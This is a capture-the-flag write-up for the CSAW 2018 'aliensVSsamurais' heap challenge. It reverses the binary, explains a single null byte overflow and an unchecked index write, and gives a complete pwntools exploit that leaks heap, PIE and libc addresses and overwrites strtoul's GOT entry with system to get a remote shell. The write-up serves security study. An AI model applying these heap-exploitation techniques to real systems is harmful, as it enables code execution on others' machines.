# Csaw 2018 Pwn 400 aliensVSsamurais

This writeup is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/CSAWQuals/2018/alien_invasion

Let's take a look at the binary:
```
$	pwn checksec aliensVSsamurais 
[*] '/Hackery/csaw18/pwn/alien/aliensVSsamurais'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	file aliensVSsamurais 
aliensVSsamurais: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=226c2e3531a2eb42de6f75a31e307146d23f990e, not stripped
$	./aliensVSsamurais 
Daimyo, nani o shitaidesu ka?
1
hmph
What is my weapon's name?
15935728
Daimyo, nani o shitaidesu ka?
Daimyo, nani o shitaidesu ka?
3
Brood mother, what tasks do we have today.
1
How long is my name?
10
What is my name?
78965412
Brood mother, what tasks do we have today.
3
Brood mother, which one of my babies would you like to rename?
1
Segmentation fault (core dumped)
```

So we can see here, that we are dealing with a `64` bit binary with a Stack Canary, Non Executable Stack, and PIE (Position Independent Executable). However it does not have RELRO enabled. Also although it is not shown, we are also given a libc file (`libc-2.23.so`). When we run the program, we appear to get a lot of menu options (and we can see that we probably used a bug to crash the binary). With that, let's reverse this code.

## Reversing

We start off with the main function:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  dojo();
  saved_malloc_hook = _malloc_hook;
  saved_free_hook = _free_hook;
  hatchery();
  invasion();
}
```

So we can see here (it becomes evident later on), that this binary has three parts. The first part deals with samurai, the second part deals with aliens, and the third part deals with a battle between the two. Also something to note here, the values of `malloc_hook` and `free_hook` are saved into the `bss` segment of memory. 

```
__int64 dojo()
{
  unsigned __int64 choice; // rax@2
  char s; // [sp+10h] [bp-20h]@2
  __int64 v3; // [sp+28h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("Daimyo, nani o shitaidesu ka?");
      fgets(&s, 24, stdin);
      choice = strtoul(&s, 0LL, 0);
      if ( choice != 2 )
        break;
      seppuku();
    }
    if ( choice == 3 )
      break;
    if ( choice == 1 )
      new_samurai();
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}s
```

Here is the function that handles the samurai portion. We have three options, `1` is to create a new samurai (`new_samurai`), `2` is to remove a samurai (`seppuku`), and `3` will just simply exit the loop and continue to the aliens portion.

```
_QWORD *new_samurai()
{
  _QWORD *heapPtr; // rax@1
  _QWORD *heapPtrTransfer; // ST08_8@1
  __int64 v2; // rax@1
  __int64 newIndex; // rcx@1
  _QWORD *result; // rax@1

  puts("hmph");
  heapPtr = malloc(0x10uLL);
  heapPtrTransfer = heapPtr;
  heapPtr[1] = 0x10LL;
  puts(loc_1530);
  fgets(&swords[8 * samurai_index], 8, stdin);
  *heapPtrTransfer = &swords[8 * samurai_index];
  v2 = samurai_index++;
  newIndex = v2;
  result = samurais;
  samurais[newIndex] = heapPtrTransfer;
  return result;
}s
```

Here we can see the process for allocating a new samurai. We can see that it starts off by allocating a heap space of `0x10` (first eight for a ptr, the second eight bytes for the size of the chunk `0x10`). Then it proceeds to scan in `0x8` bytes of data into the next free eight byte segment in `swords` (starts off empty). Proceeding that, it stores the address of eight bytes of input in the heap segment allocated earlier. Then it stores an address of that heap chunk in the next free spot in the bss memory segment `samurais`. While it is doing this, it keeps track of how many samurai were allocated with the bss variable `samurai_index`. So in conclusion, this is what the memory looks like for a new allocated samurai:

```
ptr (bss samurais array ) -> heap chunk ptr (first 0x8 bytes ptr, second 0x8 bytes size of chunk 0x10) -> eight bytes of input (bss swords array)
```

```
__int64 seppuku()
{
  unsigned __int64 v1; // [sp+8h] [bp-28h]@1
  char s; // [sp+10h] [bp-20h]@1
  __int64 v3; // [sp+28h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which samurai was dishonorable O lord daimyo?");
  fgets(&s, 24, stdin);
  v1 = strtoul(&s, 0LL, 0);
  if ( v1 <= samurai_index )
    kill_samurai(v1);
  else
    puts("That is outside of our feudal kingdom.");
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

Here we can see the code to free/delete an allocated samurai. Here it essentially just performs a bounds check on the array for what you are trying to free, then runs `kill_samurai()`:
```
_QWORD *__fastcall kill_samurai(__int64 index)
{
  _QWORD *result; // rax@1

  puts("==||==============> AAAAA");
  free((void *)samurais[index]);
  result = samurais;
  samurais[index] = 0LL;
  return result;
}
```

For `kill_samurai` we can see it just frees the heap ptr stored in `samurais`, and then set's it equal to zero to prevent a stale pointer. However we don't see it decrement `samurai_index` to match the new count. Moving on we have the alien portion (which has some nice bugs for us).

```
__int64 hatchery()
{
  unsigned __int64 choice; // rax@2
  char s; // [sp+10h] [bp-20h]@2
  __int64 v3; // [sp+28h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts("Brood mother, what tasks do we have today.");
          fgets(&s, 24, stdin);
          choice = strtoul(&s, 0LL, 0);
          if ( choice != 2 )
            break;
          consume_alien();
        }
        if ( choice > 2 )
          break;
        if ( choice == 1 )
          new_alien();
      }
      if ( choice != 3 )
        break;
      rename_alien();
    }
  }
  while ( choice != 4 );
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

Here we have a function that pretty much resembles the samurai menu function. It prompts us for input, `1` to make an alien, `2` to remove an alien, `3` to rename and alien, and `4` to exit the loop.

```
__int64 new_alien()
{
  void **v0; // ST18_8@7
  __int64 v1; // rax@7
  unsigned __int64 size; // [sp+10h] [bp-30h]@5
  char s; // [sp+20h] [bp-20h]@5
  __int64 v5; // [sp+38h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  if ( (unsigned __int64)alien_index <= 0xC7 )
  {
    if ( _malloc_hook == saved_malloc_hook )
    {
      puts("How long is my name?");
      fgets(&s, 24, stdin);
      size = strtoul(&s, 0LL, 0);
      if ( size > 7 )
      {
        v0 = (void **)malloc(0x10uLL);
        v0[1] = (void *)0x100;
        *v0 = malloc(size);
        puts("What is my name?");
        *((_BYTE *)*v0 + (signed int)read(0, *v0, size)) = 0;
        v1 = alien_index++;
        aliens[v1] = v0;
      }
      else
      {
        puts("Too short!");
      }
    }
    else
    {
      puts("WHOOOOOOOOOAAAAA");
    }
  }
  else
  {
    puts("Our mothership is too full!\n We require more overlords.");
  }
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

Here we can see the code for creating a new alien. It first prompts us with the size of the name we wish to assign, and it only proceeds if it is greater than `0x7`. Proceeding that it assigns a heap block with malloc of size `0x10`, with the first eight bytes being a ptr to the name, and the second eight bytes containning `0x100`. Proceeding that it will allocate another chunk with the size being the size we requested, and will scan in `x` bytes, where `x` is the size of the name we specified. Proceeding that it will increment the bss variable `alien_index`, and store the address of the `0x10` heap block in the bss array `aliens`. So this is what the heap layout looks like for an alien:

```
heap block 0x10, contains ptr in first 0x8 bytes, and 0x100 in second eight bytes -> heap block containning name (bytes is specified by user, must be greater than `0x7`)
```

however with that code, we see a bug with the null termination functionallity:

```
        *((_BYTE *)*v0 + (signed int)read(0, *v0, size)) = 0;
```

The read function returns the amount of bytes it scans in (which if we input the maximum amount, it will return the number of bytes which the heap block is the size of). It then adds that integer to the ptr  for the heap block, dereferences the pointer after the addition, and sets it equal to the byte `0x00`. Thing is since `ptr + 2` will point to the third element of `ptr`, if we have read scan in the maximum number of bytes, this will dereference the byte immediately proceeding our heap block and set it equal to `0x00`. With that we have a single null byte overflow.

```
__int64 consume_alien()
{
  unsigned __int64 v1; // [sp+8h] [bp-28h]@1
  char s; // [sp+10h] [bp-20h]@1
  __int64 v3; // [sp+28h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which alien is unsatisfactory, brood mother?");
  fgets(&s, 24, stdin);
  v1 = strtoul(&s, 0LL, 0);
  if ( v1 <= alien_index )
  {
    if ( _free_hook == saved_free_hook )
      kill_alien(v1);
    else
      puts("Whooooaaaaaaaa");
  }
  else
  {
    puts("That alien is too far away >(");
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

Looking at this function, we can see that it essentially checks to see that if the current free hook is equal to the saved free hook. If it is it will run the `kill_alien` function, which essentially just frees the heap ptr for the alien, and sets the ptr equal to `0x0` to prevent a stale pointer.  This happens if the index we pass it for the alien it is freeing pases the index check, which it just has to be less than or equal to `alien_index`.

```
__int64 rename_alien()
{
  unsigned __int64 v0; // rax@1
  __int64 v1; // ST00_8@1
  char s; // [sp+10h] [bp-20h]@1
  __int64 v4; // [sp+28h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  puts("Brood mother, which one of my babies would you like to rename?");
  fgets(&s, 24, stdin);
  v0 = strtoul(&s, 0LL, 0);
  printf("Oh great what would you like to rename %s to?\n", *(_QWORD *)aliens[v0], v0);
  *(_BYTE *)(*(_QWORD *)aliens[v1] + read(0, *(void **)aliens[v1], 8uLL)) = 0;
  return *MK_FP(__FS__, 40LL) ^ v4;
}
```

In this function, we can see an interesting write what where bug, that we will use later. Essentially what this function does is it prompts the user for an index to print/write to starting at `aliens` (which is in the bss). It expects a ptr to a ptr, which it will dereference twice, then allow us to write `0x8` bytes to. The bug is the fact that it doesn't check to make sure we stay within the `aliens` array, so we can also use this on the `swords` and `samurais` (holds pointers to pointers which lead to `swords`). A downside to this is that if it scans in eight bytes of data, it will set the next eight bytes equal to `0x0`. We have enough to get rce.

## Exploitation

So we have a single null byte overflow (which due to the libc version and our abillity to create/free chunks, we can use to get a libc infoleak) and a write. My first attempt to land these bugs was to write over the hooks for `malloc` and `free`, however I quickly found that this wasn't realistic. I couldn't write over the hook for `free`, since immediately proceeding it at offset `0x202090` was `stdin@@GLIBC` which would be overwritten with `0x0` and cause the program to crash before we got rce. Writing over the hook for `malloc` could be done, however we would need an infoleak to break `PIE`, which at that point we might as well overwrite the GOT table (which is what we are going to do).  In order to write to the GOT table (which we can do since RELRO is disabled) we will need a PIE infoleak, which we will need a heap infoleak to get. 

Starting off we will allocate three samurai chunks, since they contain pointers to the `bss`, which we will use later when we leak it:

```
chunk 0:	0x21
chunk 1:	0x21
chunk 2:	0x21
```

#### leaking heap address (heap consolidation)

So we are going to be going after one of the heap addresses stored in the heap, created by the `new_alien` function. We will due to this by causing heap consolidation, by using the single null byte overflow to overflow the previous in use bit of a chunk, then free that chunk and because the previous in use bit for that chunk is set to `0x0`, it will think the previous chunk is freed and move the edge of the heap up to the block before the previous. We start off by allocating three chunks:

```
chunk 3:	16 bytes	chunk 4:	0x20 bytes
chunk 5:	248 bytes	chunk 6:	0x20 bytes
chunk 7:	248 bytes	chunk 8:	0x20 bytes
```

Remember for each alien we make, there are two chunks allocated. Next we will free chunks `3` and `4`, to get chunk `4` added to the fastbin list:

```
chunk 3:	 (freed )16 bytes	chunk 4: (freed) 0x20 bytes
chunk 5:	248 bytes	chunk 6:	0x20 bytes
chunk 7:	248 bytes	chunk 8: 0x20 bytes
```

next we will allocated another large chunk (`240` bytes). Here the smaller `0x21` sized chunk which holds a malloc pointer will be adjacent to chunk `4`, due to the chunk `1` being added to the fastbin list:
```
chunk 5:	248 bytes	chunk 6:	0x20 bytes
chunk 7:	248 bytes	chunk 8:	0x20 bytes
chunk 9:	248 bytes	chunk 10:	0x20 bytes
```

Next we will create a new chunk in order to prevent heap consolidation with the top chunk:

```
chunk 5:	248 bytes	chunk 6:	0x20 bytes
chunk 7:	248 bytes	chunk 8:	0x20 bytes
chunk 9:	248 bytes	chunk 10:	0x20 bytes
chunl 11:	16 bytes	chunk 12:	0x20 bytes
```

Next we will free chunks `7` and `8`. which will go to the unsorted bin and fastbin:
```
chunk 5:	248 bytes	chunk 6:	0x20 bytes
chunk 7: (freed)	248 bytes	chunk 8: (freed)	0x20 bytes
chunk 9:	248 bytes	chunk 10:	0x20 bytes
chunl 11:	16 bytes	chunk 12:	0x20 bytes
```

Next we will fill in the space left by chunk `7`, with a chunk of the same sized. And because of the null byte overflow (we are overflowing chunk `9`), we will overwrite `0x101` to `0x100` thus setting the previous in use bit to `0x0`. In addition to that, we will set the previous size to `544`, so that it will consolidate with chunk `5`:

```
chunk 5:	248 bytes	chunk 6:	0x20 bytes
chunk 13:	248 bytes	chunk 14:	0x20 bytes
chunk 9:	248 bytes	chunk 10:	0x20 bytes
chunl 11:	16 bytes	chunk 12:	0x20 bytes
```

Next we will need to free chunks `5` & `6`, the reason for this being is that if we don't free these chunks, it will stop our heap consolidation from going where we need it to:

```
chunk 5:	(freed) 248 bytes	chunk 6:	(freed) 0x20 bytes
chunk 13:	248 bytes	chunk 14:	0x20 bytes
chunk 9:	248 bytes	chunk 10:	0x20 bytes
chunl 11:	16 bytes	chunk 12:	0x20 bytes
```

Now that the heap consolidation is setup, we can trigger it by freeing chunk `9`:

```
heap consolidated past chunks 13 & 14
chunk 13:	248 bytes	chunk 14:	0x20 bytes
chunk 9:	(freed) 248 bytes	chunk 10: (freed)	0x20 bytes
chunl 11:	16 bytes	chunk 12:	0x20 bytes
```

Next we will allocate another `248` byte chunk. This will place the fwd pointer (which points to a heap address) where the data section of chunk `13` is, which will allow us to leak the libc address by renaming the fifth alien (chunk `13`):

```
chunk 14:	248 bytes	chunk 15:	0x20 bytes
chunk 13:	248 bytes	chunk 14:	0x20 bytes
chunk 11:	16 bytes	chunk 12:	0x20 bytes
```

With that, we get a heap infoleak.

#### leaking libc, PIE, and rce

Now we already have the ground work done to leak an address that we have a pointer to. We just have to free the chunks `14` and `15`, then fill the space with enough data to place the pointer in the first `0x8` bytes of chunk `13`. We will start with leaking a PIE address. Now we know there are pointers on the heap (the samurai), that point to the bss segment so we can use those. Since their offset from the start of the heap should always be the same, and we have a heap infoleak, we can just place an address to the `heap->bss` ptr where the start of chunk `13` is, then edit it to get an infoleak for PIE.

The process of leaking a libc address will be fairly similar. Using the PIE infoleak, we can calculate the GOT table address for the function `strtoul`, and place it at the start of chunk `13` like we just did. Then we can print the rename alien `5` (just like with the PIE infoleak) and it will give us the libc address of `strtoul`. Except here, we will write to it the address of system. That way when `strtoul` is called, it will really be calling `system`. That way when we get prompted for the next menu option in `hatchery`, we can just pass it the string `/bin/sh`, and it will run `system(/bin/sh)`

## Exploit

Here is the code for our expliot:

```
# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/CSAWQuals/2018/alien_invasion

from pwn import *

# Establish the target prcoess, and elfs
#target = process('./aliensVSsamurais', env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)
targetElf = ELF('aliensVSsamurais')
libcfile = ELF('libc-2.23.so')
target = remote('pwn.chal.csaw.io', 9004)

# Establish functions to interact with code
def addSamurai(name):
        print target.recvuntil("Daimyo, nani o shitaidesu ka?\n")
        target.sendline('1')
        print target.recvuntil("hmph\nWhat is my weapon's name?\n")
        target.sendline(name)


def remSamurai(i):
        print target.recvuntil("Daimyo, nani o shitaidesu ka?\n")
        target.sendline('2')
        target.sendline(str(i)) 

def goHorde():
    target.sendline("3")

# We have two options with this function, one to rename the memory with what was there so we don't cause any changes that screw us over, and another which doesn't
# send data to overwrite it, which is used when we write system over the got entry for strtoul
def renameAlien(offset, libc=0):
        print target.recvuntil("Brood mother, what tasks do we have today.")
        target.sendline("3")
        print target.recvuntil("Brood mother, which one of my babies would you like to rename?")
        target.sendline(str(offset))
        print target.recvuntil('Oh great what would you like to rename ')
        leak = target.recvline()
        leak = leak.replace(" to?\n", "")
        leak = u64(leak + "\x00"*(8 - len(leak)))
        if libc != 1:
            target.send(p64(leak))
        return leak


def makeAlien(len, name):
        print target.recvuntil("Brood mother, what tasks do we have today.")
        target.sendline("1")
        print target.recvuntil("How long is my name?\n")
        target.sendline(str(len))
        print target.recvuntil("What is my name?")
        target.sendline(name)

def remAlien(i):
        print target.recvuntil("Brood mother, what tasks do we have today.")
        target.sendline("2")
        print target.recvuntil("Which alien is unsatisfactory, brood mother?")
        target.sendline(str(i))

# Add the three samurais used for the PIE infoleak 
addSamurai("15935728")
addSamurai("75395128")
addSamurai("95135728")

# Exit the samurai mode, go over to the horde
goHorde()

# Go through the process of heap consolidation to get a heap infoleak. Check the writeup for details

makeAlien(16, "0"*14 + "\n")
makeAlien(248, "1"*246 + "\n")
makeAlien(248, "2"*246 + "\n")


remAlien(0)


makeAlien(248, "3"*346 + '\n')


makeAlien(16, "4"*13 + "\n")


remAlien(2)


makeAlien(248, "5"*240 + p64(544))


remAlien(1)


remAlien(3)


makeAlien(248, "6"*16 + '\n')


# Leak the heap address, and calculate the base of the heap
heapleak = renameAlien(5)
heapBase = heapleak - 0x1820
log.info("heap base: " + hex(heapBase))

# Get the PIE infoleak

remAlien(6)

makeAlien(280, '7'*256 + p64(heapBase + 0x1450) + '\n')

pieleak = renameAlien(5)
pieBase = pieleak - 0x202708
log.info("PIE base: " + hex(pieBase))

# Get the libc infoleak

remAlien(7)

makeAlien(280, '8'*256 + p64(pieBase + 0x202058) + '\n')

strtoul_addr = renameAlien(5, 1)
libc_base = strtoul_addr - libcfile.symbols['strtoul']
log.info("libc base: " + hex(libc_base))

# Write over the got address of strtoul with system

system = libc_base + libcfile.symbols['system']
target.send(p64(system))

# Send /bin/sh which will get passed to strtoul, which due to the got write is really system

target.sendline('/bin/sh')

# Enjoy the shell

target.interactive()
```

and when we run it:

```
$	python exploit.py 
[*] '/Hackery/csaw18/pwn/alien/aliensVSsamurais'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/Hackery/csaw18/pwn/alien/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 9004: Done

.	.	.

[*] libc base: 0x7f04c90d2000
[*] Switching to interactive mode
Brood mother, what tasks do we have today.
/bin/sh: 0: can't access tty; job control turned off
$ $ w
 05:07:27 up 14 days,  4:34,  0 users,  load average: 11.51, 11.31, 11.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ $ ls
aliensVSsamurais  art.txt  flag.txt  run.sh
$ $ cat flag.txt
flag{s000000000000maa@@@@@nnnnnYYYB@@@@@@neeeelinggs}
```

Just like that, we got the flag!